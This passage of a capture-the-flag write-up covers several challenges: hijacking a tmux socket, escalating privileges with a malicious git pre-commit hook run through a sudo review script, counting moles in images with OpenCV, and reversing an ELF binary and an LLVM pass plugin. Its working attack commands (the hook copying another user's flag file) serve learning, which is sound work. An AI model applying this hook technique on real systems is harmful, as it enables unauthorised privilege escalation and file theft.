+srw-rw-rw- 1 dev dev 0 Nov 29 00:56 /tmp/tmux-1002
+```
+
+Connect with `tmux -S /tmp/tmux-1002 attach` and get the flag:
+```shell
+dev@movie_night:~$ whoami    
+dev  
+dev@movie_night:~$ ls  
+flag.txt  procservice_src  
+dev@movie_night:~$ cat flag.txt    
+Hero{1s_1t_tmux_0r_4l13n?_a20bac4b5aa32e8d9a8ccb75d228ca3e}  
+dev@movie_night:~$
+```
+
+`Hero{1s_1t_tmux_0r_4l13n?_a20bac4b5aa32e8d9a8ccb75d228ca3e}`
+
+___
+
+## Neverland (system)
+
+**Description**: Peter Pan and Captain Hook are once again fighting in Neverland, instead of working and pushing PRs into production. Since this is a regular occurence, we have created a script that allows the intern to review PRs in their stead. Please don't touch Peter's fairy powder stock in /home/peter/flag.txt (i'm still convinced it's cocaine though, why else would they run around with swords in the office pretending they are flying ??). Credentials: `intern:fairy` 
+
+**Format**: `^Hero{\S+}$`
+
+**Category**: Misc
+
+**Author**: Log_s
+
+I ssh into the challenge server: `ssh -p 13201 intern@dyn01.heroctf.fr`
+
+Running `sudo -l` I see I can run `/opt/commit.sh`:
+```shell
+intern@neverland:~$ sudo -l    
+Matching Defaults entries for intern on neverland:  
+   env_reset, mail_badpass, secure_path=/usr/local/sbin\:/usr/local/bin\:/usr/sbin\:/usr/bin\:/sbin\:/bin, use_pty  
+  
+User intern may run the following commands on neverland:  
+   (peter) /opt/commit.sh
+```
+
+`/opt/commit.sh` automates reviewing and making `git` commits:
+```shell
+#!/bin/bash
+
+# ==============================================================================
+#  Admin Git Review & Commit Script
+# ==============================================================================
+#
+# DESCRIPTION:
+# This script is intended to be run by an 'admin' user. It automates the
+# process of reviewing and committing changes from a user-submitted Git
+# repository archive.
+#
+
+# --- Configuration ---
+
+# Path to the admin's "official" repository.
+# This script will initialize it if it doesn't exist.
+ADMIN_REPO_PATH="/app"
+# Directory to temporarily extract user submissions.
+TEMP_DIR="/home/peter/git-review-$$" # $$ ensures a unique directory per run
+
+
+# --- Script Body ---
+
+# Exit immediately if a command exits with a non-zero status.
+set -e
+
+# Function to print messages with a prefix
+log() {
+    echo "[ADMIN GIT COMMIT] $1"
+}
+
+
+# 1. Validate user input
+if [ "$#" -ne 1 ]; then
+    log "ERROR: You must provide the path to one repository archive (.tar.gz)."
+    log "Usage: $0 <path-to-archive.tar.gz>"
+    exit 1
+fi
+
+USER_ARCHIVE=$1
+
+if [ ! -f "$USER_ARCHIVE" ]; then
+    log "ERROR: File not found: $USER_ARCHIVE"
+    exit 1
+fi
+
+
+# 2. Prepare for review
+log "Received submission: $USER_ARCHIVE"
+mkdir -p "$TEMP_DIR"
+log "Extracting archive to temporary directory: $TEMP_DIR"
+tar -xzf "$USER_ARCHIVE" -C "$TEMP_DIR"
+
+EXTRACTED_DIR=$(find "$TEMP_DIR" -mindepth 1 -maxdepth 1 -type d)
+cd "$EXTRACTED_DIR"
+log "Changed directory to $(pwd)"
+
+
+# 3.1 Security Check 1: Verify commit history
+log "Verifying that your repository is up-to-date..."
+ADMIN_LAST_COMMIT=$(git --git-dir="$ADMIN_REPO_PATH/.git" log -1 --pretty=%H)
+USER_LAST_COMMIT=$(git log -1 --pretty=%H)
+
+log "Admin's latest commit: $ADMIN_LAST_COMMIT"
+log "Your latest commit:    $USER_LAST_COMMIT"
+
+if [ "$ADMIN_LAST_COMMIT" != "$USER_LAST_COMMIT" ]; then
+    log "REJECTED: Your repository's last commit does not match the official repository."
+    log "Please pull the latest changes from the official repository before submitting."
+    rm -rf "$TEMP_DIR"
+    exit 1
+fi
+
+log "SUCCESS: Commit history matches."
+
+
+# 3.2 Security Check 2: Verify .git/config integrity
+log "Verifying integrity of .git/config file..."
+ADMIN_CONFIG_HASH=$(sha256sum "$ADMIN_REPO_PATH/.git/config" | awk '{ print $1 }')
+USER_CONFIG_HASH=$(sha256sum ".git/config" | awk '{ print $1 }')
+
+log "Admin's .git/config hash: $ADMIN_CONFIG_HASH"
+log "Your .git/config hash:    $USER_CONFIG_HASH"
+
+if [ "$ADMIN_CONFIG_HASH" != "$USER_CONFIG_HASH" ]; then
+    log "REJECTED: Your .git/config file has been tampered with. Integrity check failed."
+    rm -rf "$TEMP_DIR"
+    exit 1
+fi
+
+log "SUCCESS: .git/config is valid. Proceeding with review."
+
+
+# 4. Review and Commit the changes
+log "Reviewing your proposed changes..."
+echo "--------------------------------------------------"
+git status
+echo "--------------------------------------------------"
+
+log "Everything looks good. Adding your changes to the staging area."
+git add .
+
+log "Committing your changes to the official branch. Stand by..."
+GIT_COMMITTER_NAME="Admin" GIT_COMMITTER_EMAIL="admin@localhost" \
+git commit -m "Accepted user submission" > /dev/null
+
+log "Changes successfully committed."
+
+
+# 5. Cleanup
+log "Cleaning up temporary files..."
+cd /
+rm -rf "$TEMP_DIR"
+
+log "Process complete. Thank you for your contribution."
+exit 0
+```
+
+To use a git hook and read the flag I need to use the admin repo. I copy the repo to my directory:
+```shell
+cp -r /app myrepo
+```
+
+I create a malicious git hook to copy the flag from `/home/peter/flag.txt` into `/tmp/pwnflag` and make it executable:
+```shell
+echo -e '#!/bin/bash\ncat /home/peter/flag.txt > /tmp/pwnflag\n' > myrepo/.git/hooks/pre-commit
+chmod +x myrepo/.git/hooks/pre-commit
+```
+
+Compress the repo and use `/opt/commit.sh` to commit the changes:
+```shell
+intern@neverland:~$ sudo -u peter /opt/commit.sh evil.tar.gz  
+[ADMIN GIT COMMIT] Received submission: evil.tar.gz  
+[ADMIN GIT COMMIT] Extracting archive to temporary directory: /home/peter/git-review-87  
+[ADMIN GIT COMMIT] Changed directory to /home/peter/git-review-87/myrepo  
+[ADMIN GIT COMMIT] Verifying that your repository is up-to-date...  
+[ADMIN GIT COMMIT] Admin's latest commit: 8909267a2af52ec31141001cbce39d6da4dce4c3  
+[ADMIN GIT COMMIT] Your latest commit: 8909267a2af52ec31141001cbce39d6da4dce4c3  
+[ADMIN GIT COMMIT] SUCCESS: Commit history matches.  
+[ADMIN GIT COMMIT] Verifying integrity of .git/config file...  
+[ADMIN GIT COMMIT] Admin's .git/config hash: cfe7ba1238c9a78be7535d7c63bcaf5a4d5011d46b07c9b45d3bbf7d6c312dfe  
+[ADMIN GIT COMMIT] Your .git/config hash: cfe7ba1238c9a78be7535d7c63bcaf5a4d5011d46b07c9b45d3bbf7d6c312dfe  
+[ADMIN GIT COMMIT] SUCCESS: .git/config is valid. Proceeding with review.  
+[ADMIN GIT COMMIT] Reviewing your proposed changes...  
+--------------------------------------------------  
+On branch master  
+Changes not staged for commit:  
+ (use "git add <file>..." to update what will be committed)  
+ (use "git restore <file>..." to discard changes in working directory)  
+       modified:   .gitignore  
+       modified:   README.md  
+       modified:   config-tool.py  
+  
+no changes added to commit (use "git add" and/or "git commit -a")  
+--------------------------------------------------  
+[ADMIN GIT COMMIT] Everything looks good. Adding your changes to the staging area.  
+[ADMIN GIT COMMIT] Committing your changes to the official branch. Stand by...  
+[ADMIN GIT COMMIT] Changes successfully committed.  
+[ADMIN GIT COMMIT] Cleaning up temporary files...  
+[ADMIN GIT COMMIT] Process complete. Thank you for your contribution. 
+```
+
+```shell
+intern@neverland:~$ cat /tmp/pwnflag  
+Hero{c4r3full_w1th_g1t_hO0k5_d4dcefb250aa8c2ffabaa57119e3bc42}
+```
+
+`Hero{c4r3full_w1th_g1t_hO0k5_d4dcefb250aa8c2ffabaa57119e3bc42}`
+
+___
+
+## Whac-A-Mole (programming)
+
+**Description**: The Whac-A-Mole game is fairly simple. But knowing how many moles there is a clear plus. Can you count them for me? 
+
+Note to begginers #1: Croping a mole model out, and using an exact pixel comparison is often not the best way to approach this problem. This is mainly due to different softwares blending pixels together when pasting an image on an other. In the current case, the background image and the moles have pretty different main colors. You could use this to create [a mask](https://medium.com/@sunil.veera/exploring-color-manipulation-in-images-with-opencv-masking-vs-custom-color-selection-803d9742969c). The opencv function `connectedComponentsWithStats` can count elements, when provided with a mask.
+
+Note to begginers #2: An AI model would find a working solution very easily. I would however advise to try and work out a solution yourself if speed is not of the essence for you.
+
+Note to begginers #3: Please find attached a template that will help you handle the interactions with the challenge.
+
+TCP: `nc prog.heroctf.fr 8000` 
+
+**Format**: `^Hero{\S+}$`
+
+**Category**: Programming
+
+**Author**: Log_s
+
+Contents of `template.py`:
+```python
+from pwn import *  
+  
+# Adjust depending challenge adress  
+HOST = "localhost"  
+PORT = 8001  
+  
+io = remote(HOST, PORT)  
+  
+while True:  
+    line = io.recvline()  
+    if b"IMAGE:" in line:  
+        # Read the base64 encoded image  
+        b64img = io.recvline().strip()  
+        log.info(f"Got image (length {len(b64img)})")  
+  
+        # The server asks for answer  
+        io.recvuntil(b">> ")  
+  
+        # TODO: process image and compute answer  
+        answer = 0  
+  
+        # Send back the answer  
+        io.sendline(str(answer).encode())  
+  
+    elif b"Wrong answer!" in line or b"Hero" in line:  
+        # Print the line and exit if it's an error or contains the flag  
+        print(line.decode().strip())  
+        io.close()  
+    break  
+    else:  
+        log.info(line.decode().strip())
+```
+
+When I connect to the server I see this:
+```shell
+nc prog.heroctf.fr 8000  
+
+IMAGE:  
+iVBORw0KGgoAAAANSUhEUgAAA4YAAAFoCAIAAACEwHKBAAEAAElEQVR4nGz9TZLkSrIljB1VNTMAHpGZt6r79Rq4AIpwQm6HUw65AAoXwBVwyAWQe2pKy/e6bmaGuwNm+sOBGuCe1fT35FZkZrg7YDDTn6NHj9L/9f/1f2DmiDAzApiZiGB+1yYizEwU+ZcRZmaEHhH5T+4+xgAgIhHGXIgIHu4OBzMzM0kEISIiQsMBEBEzozcWoSIAzMzdOcBE7j3f6O7unt8lIrs7PPK9EUQezCwiPnpEAGAGEc1PC11v677v7l5rZRYzMzMicrdSChGrajgRUQSZWVmX60ryW/LuftyWMcYwzdtkkYhwd+HIe8n/5l+6+/bxmW90d2YupQBw9wgTkfx5fhQzAJhHRC4yAPf5Raru7iRcajXE3g91L6V88GZmecvubmbMXGu1oREBJhGy8DGGhjIzotZam5RwV1WP4FpKKT4UQD
+...
+MK1osz+83/5fVVVg/6M1jxbm0Xa7B8xVmMsO25SQlKGaaYlpTNuWxpJ6MXcRKeN0uVk4qQ/KPOGgBdmagU2Z52mcFWnJYQ4CUFaABdzs3HDC1X53TCJ0c7N0XD/yUkAjBOj1u6Uo4ONxizl1uQogYk9Phw0tCMcitlFkqcopYRED4OUrUVJaVaK0W8KL51Yee/8/LlvIZxE8NlwAAAAASUVORK5CYII=  
+How many moles ?  
+>>    
+[!] Timeout: you took too long (1s).
+```
+
+When you connect to the server it sends a base64 encoded image. I need to count the moles for each image and submit the count to the server. Example of image:
+
+![Alt text](/images/debug_image.png)
+
+Solve script:
+```python
+from pwn import *
+import cv2
+import numpy as np
+import base64
+
+HOST = "prog.heroctf.fr"
+PORT = 8000
+
+io = remote(HOST, PORT)
+
+try:
+    while True:
+        line = io.recvline(timeout=2)
+        
+        if b"IMAGE:" in line:
+            b64img = io.recvline().strip()
+            
+            # decode image
+            img_bytes = base64.b64decode(b64img)
+            np_arr = np.frombuffer(img_bytes, np.uint8)
+            img = cv2.imdecode(np_arr, cv2.IMREAD_COLOR)
+            
+            # convert to HSV (hue, saturation, value)
+            hsv = cv2.cvtColor(img, cv2.COLOR_BGR2HSV)
+            
+            # create mask for the green background
+            lower_green = np.array([35, 50, 50])
+            upper_green = np.array([85, 255, 255])
+            green_mask = cv2.inRange(hsv, lower_green, upper_green)
+            
+            # invert image to get the moles
+            mole_mask = cv2.bitwise_not(green_mask)
+            
+            # clean up the mask
+            kernel = np.ones((5, 5), np.uint8)
+            mole_mask = cv2.morphologyEx(mole_mask, cv2.MORPH_OPEN, kernel)
+            mole_mask = cv2.morphologyEx(mole_mask, cv2.MORPH_CLOSE, kernel)
+            
+            # find contours
+            contours, _ = cv2.findContours(mole_mask, cv2.RETR_EXTERNAL, cv2.CHAIN_APPROX_SIMPLE)
+            
+            # count the moles
+            mole_areas = []
+            for contour in contours:
+                area = cv2.contourArea(contour)
+                if area > 100:
+                    mole_areas.append(area)
+            
+            count = len(mole_areas)
+            
+            print(f"Found {count} moles")
+            
+            io.sendline(str(count).encode())
+            
+        elif b"Wrong answer!" in line or b"Hero{" in line:
+            print(line.decode())
+            break
+        else:
+            print(line.decode().strip())
+            
+except EOFError:
+    print("Connection closed")
+finally:
+    io.close()
+```
+
+Output:
+```shell
+python3 solve4.py  
+[+] Opening connection to prog.heroctf.fr on port 8000: Done
+Found 5 moles  
+How many moles ?  
+Found 5 moles  
+How many moles ?  
+Found 4 moles  
+How many moles ?  
+Found 3 moles  
+How many moles ?  
+Found 3 moles  
+How many moles ?  
+Found 5 moles  
+How many moles ?  
+Found 5 moles  
+How many moles ?  
+Found 4 moles  
+How many moles ?  
+Found 6 moles  
+How many moles ?  
+Found 6 moles  
+How many moles ?  
+Found 10 moles  
+How many moles ?  
+Found 3 moles  
+How many moles ?  
+Found 8 moles  
+How many moles ?  
+Found 11 moles  
+How many moles ?  
+Found 10 moles  
+How many moles ?  
+>> Hero{c0l0r_m4sk1ng_4_c1u5t3r1ng_30cbdb51ae9a289fadcaa7be2f534151}  
+  
+[*] Closed connection to prog.heroctf.fr port 8000
+```
+After getting the count correct for 15 images you get the flag!
+
+`Hero{c0l0r_m4sk1ng_4_c1u5t3r1ng_30cbdb51ae9a289fadcaa7be2f534151}`
+
+___
+
+## The Chef's Secret Recipe (reverse)
+
+**Description**: You will never guess the secret recipe for my secret flag-cake!
+
+**Format**: `^Hero{\S+}$`
+
+**Category**: Reverse
+
+**Author**: Teddysbears
+
+I get the binary:
+```shell
+file my_secret_recipe  
+my_secret_recipe: ELF 64-bit LSB pie executable, x86-64, version 1 (SYSV), dynamically linked, interpreter /lib64/ld-linux-x86-64.so.2, BuildID[sha1]=6cb2bb5b0deb01af01607f6b8bec1664200e591d, for GNU/Linux 4.4.0, not stripped
+```
+
+This is the main function I see in ghidra:
+```d
+undefined8 main(int param_1,undefined8 *param_2)
+
+{
+  int iVar1;
+  undefined8 uVar2;
+  long in_FS_OFFSET;
+  undefined8 local_48;
+  undefined8 local_40;
+  undefined8 local_38;
+  undefined local_30;
+  undefined7 uStack_2f;
+  undefined uStack_28;
+  undefined8 local_27;
+  long local_10;
+  
+  local_10 = *(long *)(in_FS_OFFSET + 0x28);
+  if (param_1 < 2) {
+    printf("[-] Missing arguments, usage %s <FLAG_STR>\n",*param_2);
+    uVar2 = 1;
+  }
+  else {
+    local_48 = 0;
+    local_40 = 0;
+    local_38 = 0;
+    local_30 = 0;
+    uStack_2f = 0;
+    uStack_28 = 0;
+    local_27 = 0;
+    printf(&DAT_00102300,
+           "\tTo bake the perfect flag-cake: sift the flour, add sugar, crack some eggs,\n \tmelt th e butter, blend in vanilla and milk, whisk the cocoa, fold in the baking powder,\n \tswir l in the cream, chop some cherry, toss on sprinkles, preheat the oven, grease the pan,\n  \tline it with parchment, set the timer, light a candle, serve on a plate, and garnish wi th frosting,\n \ta pinch of salt, and crushed nuts for that final touch of sweetness. \n\ n"
+          );
+    parse_recipe("\tTo bake the perfect flag-cake: sift the flour, add sugar, crack some eggs,\n \tm elt the butter, blend in vanilla and milk, whisk the cocoa, fold in the baking powder,\n \tswirl  in the cream, chop some cherry, toss on sprinkles, preheat the oven, grease the pan,\n \tline i t with parchment, set the timer, light a candle, serve on a plate, and garnish with frosting,\n  \ta pinch of salt, and crushed nuts for that final touch of sweetness. \n\n"
+                 ,&local_48);
+    iVar1 = strcmp((char *)&local_48,(char *)param_2[1]);
+    if (iVar1 == 0) {
+      printf("[+] Good job you here is your flag: %s\n",&local_48);
+    }
+    else {
+      puts("[-] Nope");
+    }
+    uVar2 = 0;
+  }
+  if (local_10 != *(long *)(in_FS_OFFSET + 0x28)) {
+                    /* WARNING: Subroutine does not return */
+    __stack_chk_fail();
+  }
+  return uVar2;
+}
+```
+
+`parse_recipe()`:
+```d
+void parse_recipe(char *param_1,long param_2)
+
+{
+  undefined uVar1;
+  int iVar2;
+  long in_FS_OFFSET;
+  char *local_438;
+  ulong local_430;
+  char local_428 [1023];
+  undefined local_29;
+  long local_20;
+  
+  local_20 = *(long *)(in_FS_OFFSET + 0x28);
+  strncpy(local_428,param_1,0x400);
+  local_29 = 0;
+  local_438 = strtok(local_428," \n");
+  do {
+    if (local_438 == (char *)0x0) {
+      if (local_20 != *(long *)(in_FS_OFFSET + 0x28)) {
+                    /* WARNING: Subroutine does not return */
+        __stack_chk_fail();
+      }
+      return;
+    }
+    normalize_word(local_438);
+    for (local_430 = 0; local_430 < 0x29; local_430 = local_430 + 1) {
+      iVar2 = strcmp(local_438,*(char **)(ingredients + local_430 * 0x10));
+      if (iVar2 == 0) {
+        uVar1 = (**(code **)(ingredients + local_430 * 0x10 + 8))();
+        *(undefined *)(param_2 + local_430) = uVar1;
+        break;
+      }
+    }
+    local_438 = strtok((char *)0x0," \n");
+  } while( true );
+}
+```
+`normalize_word()` strips non letters and lowercases the ingrendient word. 
+
+There are many ingredient functions that belong to the `ingredients` table:
+```d
+undefined8 milk(void)
+
+{
+  return 0x79;
+}
+```
+When `parse_recipe()` sees the word `"milk"`, it calls `milk()`, which returns `0x79`. These bytes get concatenated to reconstruct the flag.
+
+`ingredients` is an array of 41 entries:
+```shell
+readelf -s ./my_secret_recipe | grep ingredients  
+   40: 0000000000004060   656 OBJECT  GLOBAL DEFAULT   24 ingredients
+```
+
+Solve script:
+```python
+#!/usr/bin/env python3
+import sys, struct, re
+from pwn import ELF
+
+if len(sys.argv) != 2:
+    print("usage: solve5.py ./my_secret_recipe"); sys.exit(1)
+
+elf = ELF(sys.argv[1])
+ING_COUNT = 0x29
+ING_ADDR = elf.symbols['ingredients']
+
+def q(a): return struct.unpack("<Q", elf.read(a,8))[0]
+def s(a): return elf.read(a,200).split(b"\x00",1)[0].decode('latin1')
+
+def extract_byte_from_func(func_addr):
+    fb = elf.read(func_addr, 64)
+    i = fb.find(b'\xb8')
+    if i != -1 and i+5 <= len(fb):
+        return struct.unpack_from('<I', fb, i+1)[0] & 0xff
+    i = fb.find(b'\xb0')
+    if i != -1 and i+2 <= len(fb):
+        return fb[i+1]
+    return None
+
+mapping = {}
+for i in range(ING_COUNT):
+    entry = ING_ADDR + i*0x10
+    name_ptr = q(entry)
+    fn_ptr   = q(entry+8)
+    try:
+        name = s(name_ptr)
+    except:
+        name = f"<err@{name_ptr:x}>"
+    val = extract_byte_from_func(fn_ptr)
+    if val is not None:
+        mapping[name] = val
+    else:
+        pass
+
+recipe = """To bake the perfect flag-cake: sift the flour, add sugar, crack some eggs, melt the butter, blend in vanilla and milk, whisk the cocoa, fold in the baking powder, swirl in the cream, chop some cherry, toss on sprinkles, preheat the oven, grease the pan, line it with parchment, set the timer, light a candle, serve on a plate, and garnish with frosting, a pinch of salt, and crushed nuts for that final touch of sweetness.
+"""
+
+def norm(w): return re.sub(r'[^a-z]', '', w.lower())
+
+tokens = [norm(t) for t in recipe.split() if norm(t)]
+
+out = []
+for t in tokens:
+    if t in mapping:
+        out.append(mapping[t])
+
+flag = bytes(out).decode('latin1')
+print(flag)
+```
+
+Output:
+```shell
+python3 solve5.py ./my_secret_recipe  
+[*] '/home/user/Desktop/ctf/heroCTF/my_secret_recipe'  
+   Arch:       amd64-64-little  
+   RELRO:      Partial RELRO  
+   Stack:      Canary found  
+   NX:         NX enabled  
+   PIE:        PIE enabled  
+   Stripped:   No  
+Hero{0h_N0_y0u_60T_My_S3cReT_C4k3_R3c1pe}
+```
+
+`Hero{0h_N0_y0u_60T_My_S3cReT_C4k3_R3c1pe}`
+
+___
+
+## Apprentice of the IR Forge (reverse)
+
+**Description**: Deep beneath the compiler’s citadel lies the IR Forge — a molten realm where runes of computation are shaped into order. Apprentice blacksmiths of logic come here to temper their skill and learn to read the language of transformations. Will you be worthy of becoming an apprentice at the IR forge?  
+
+Note: The given archive contains a python script to send your payload to server.  
+Note: A Dockerfile is also in the archive in order to run the challenge as it is on the server. 
+TCP: `nc reverse.heroctf.fr 7002`
+
+**Format**: `^Hero{\S+}$`
+
+**Category**: Reverse
+
+**Author**: Teddysbears
+
+I get the challenge files. The `solve_template.py` file I got was not correctly receiving data back from the server I think. I used my own script. The main file is `apprentice_of_the_IR_forge.so`:
+```shell
+file apprentice_of_the_IR_forge.so  
+apprentice_of_the_IR_forge.so: ELF 64-bit LSB shared object, x86-64, version 1 (SYSV), dynamically linked, BuildID[sha1]=e584bb098341209ec2239449b13dd93ca03e5a8e, not stripped
+```
+
+When connecting to the server:
+```shell
+nc reverse.heroctf.fr 7002  
+Enter your valid_pass.c code (end with EOF or Ctrl+D):
+
+```
+
+I open `apprentice_of_the_IR_forge.so` in Ghidra and find the function that will serve the flag:
+```d
+/* hero::custom_pass::run(llvm::Function&, llvm::AnalysisManager<llvm::Function>&) */
+
+custom_pass * __thiscall
+hero::custom_pass::run(custom_pass *this,Function *param_1,AnalysisManager *param_2)
+
+{
+  byte bVar1;
+  int iVar2;
+  ulong uVar3;
+  Value *pVVar4;
+  Type *pTVar5;
+  raw_ostream *prVar6;
+  basic_streambuf *pbVar7;
+  long in_FS_OFFSET;
+  Value *local_430;
+  int local_41c;
+  undefined local_3e0 [16];
+  StringRef local_3d0 [2];
+  StringRef local_3c8;
+  basic_string local_3c0 [32];
+  basic_stringstream<> local_3a0 [16];
+  basic_ostream<> local_390 [376];
+  basic_ifstream<> local_218 [520];
+  long local_10;
+  
+  local_10 = *(long *)(in_FS_OFFSET + 0x28);
+  llvm::StringRef::StringRef((StringRef *)local_3d0,"SWORD_OF_THE_HERO");
+  llvm::Value::getName();
+  uVar3 = llvm::operator==(local_3d0[0],local_3c8);
+  local_41c = 0;
+  local_3e0 = llvm::Function::args((Function *)param_2);
+  local_430 = (Value *)llvm::iterator_range<>::begin((iterator_range<> *)local_3e0);
+  pVVar4 = (Value *)llvm::iterator_range<>::end((iterator_range<> *)local_3e0);
+  for (; local_430 != pVVar4; local_430 = local_430 + 0x28) {
+    pTVar5 = (Type *)llvm::Value::getType(local_430);
+    iVar2 = llvm::Type::getTypeID(pTVar5);
+    if (iVar2 == 0xc) {
+      local_41c = local_41c + 1;
+    }
+  }
+  pTVar5 = (Type *)llvm::Function::getReturnType((Function *)param_2);
+  iVar2 = llvm::Type::getTypeID(pTVar5);
+  if ((((uVar3 & 1) == 0) || (local_41c != 3)) || (iVar2 != 0xe)) {
+    prVar6 = (raw_ostream *)llvm::errs();
+    llvm::raw_ostream::operator<<(prVar6,"[-] Nope\n");
+  }
+  else {
+    std::basic_ifstream<>::basic_ifstream((char *)local_218,0x11433f);
+                    /* try { // try from 001117f6 to 00111859 has its CatchHandler @ 00111837 */
+    bVar1 = std::basic_ifstream<>::is_open();
+    if ((bVar1 & 1) == 0) {
+      prVar6 = (raw_ostream *)llvm::errs();
+      llvm::raw_ostream::operator<<(prVar6,"[-] Call an admin it shouldn\'t be the case \n");
+    }
+    else {
+      std::__cxx11::basic_stringstream<>::basic_stringstream();
+                    /* try { // try from 0011186a to 001118d0 has its CatchHandler @ 0011191e */
+      pbVar7 = (basic_streambuf *)std::basic_ifstream<>::rdbuf();
+      std::basic_ostream<>::operator<<(local_390,pbVar7);
+      prVar6 = (raw_ostream *)llvm::errs();
+      prVar6 = (raw_ostream *)
+               llvm::raw_ostream::operator<<(prVar6,"[+] Good job here is your flag: ");
+      std::__cxx11::basic_stringstream<>::str();
+                    /* try { // try from 001118d3 to 00111901 has its CatchHandler @ 00111932 */
+      prVar6 = (raw_ostream *)llvm::raw_ostream::operator<<(prVar6,local_3c0);
+      llvm::raw_ostream::operator<<(prVar6,"\n");
+      std::__cxx11::basic_string<>::~basic_string((basic_string<> *)local_3c0);
+      std::__cxx11::basic_stringstream<>::~basic_stringstream(local_3a0);
+    }
+    std::basic_ifstream<>::~basic_ifstream(local_218);
+  }
+  llvm::PreservedAnalyses::all((PreservedAnalyses *)this);
+  if (*(long *)(in_FS_OFFSET + 0x28) == local_10) {
+    return this;
+  }
+                    /* WARNING: Subroutine does not return */
+  __stack_chk_fail();
+}
+```
+The server is an LLVM compiler that will print the flag after it checks if the function you send meets specific criteria. 
+
+To pass the check the function must have:
+- Function name: `SWORD_OF_THE_HERO`
+- Parameters: 3 arguments of type ID 0xC
+- Return Type: Must be type ID 0xE
+
+I save this in `valid_pass.c`:
+```c
+void *SWORD_OF_THE_HERO(int a, int b, int c) {  
+    return 0;  
+}
+```
+
+Run the solve script:
+```python
+from pwn import *
+
+HOST = "reverse.heroctf.fr"
+PORT = 7002
+
+code = open("/home/user/Desktop/ctf/heroCTF/forge/src/valid_pass.c", "rb").read()
+
+io = remote(HOST, PORT)
+
+# read the banner
+banner = io.recvuntil(b"Ctrl+D):")
+print(banner.decode(errors="ignore"))
+
+# send code
+io.send(code)
+
+# send EOF
+io.shutdown('send')
+
+# read output
+resp = io.recvall(timeout=5)
+print(resp.decode(errors="ignore"))
+```
+
+Output:
+```shell
+python3 solve7.py  
+[+] Opening connection to reverse.heroctf.fr on port 7002: Done  
+Enter your valid_pass.c code (end with EOF or Ctrl+D):  
+[+] Receiving all data: Done (766B)  
+[*] Closed connection to reverse.heroctf.fr port 7002  
+  
+=== Makefile Output Start ===  
+Running apprentice_of_the_IR_forge  
+---------------------------------  
+mkdir -p bin  
+clang -O1 -emit-llvm -S src/valid_pass_K4ZGd0XRIIu2f9q0.c -o bin/emit_K4ZGd0XRIIu2f9q0.ll  
+clang -O1 -fpass-plugin=bin/apprentice_of_the_IR_forge.so src/valid_pass_K4ZGd0XRIIu2f9q0.c -o bin/valid_pass_K4ZGd0XRIIu2f9q0  
+[+] Good job here is your flag: Hero{Yu0_f0rG3d_y0uR_oWn_p47H_4pPr3nT1cE}  
+  
+/usr/bin/ld: /usr/bin/../lib64/gcc/x86_64-pc-linux-gnu/15.2.1/../../../../lib64/Scrt1.o: in function `_start':  
+(.text+0x1b): undefined reference to `main'  
+clang: error: linker command failed with exit code 1 (use -v to see invocation)  
+make: *** [/home/challenge/Makefile_K4ZGd0XRIIu2f9q0:20: bin/valid_pass_K4ZGd0XRIIu2f9q0] Error 1  
+=== Makefile Output End ===
+```
+
+`Hero{Yu0_f0rG3d_y0uR_oWn_p47H_4pPr3nT1cE}`
+
+___
